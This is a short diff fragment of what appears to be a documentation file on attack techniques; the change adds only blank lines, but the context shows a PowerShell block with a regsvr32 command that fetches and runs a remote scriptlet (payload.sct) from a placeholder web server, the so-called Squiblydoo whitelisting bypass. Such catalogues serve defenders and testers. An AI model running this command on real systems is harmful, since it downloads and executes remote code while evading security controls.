@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:09.950415+00:00'
 ```powershell
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
+
+
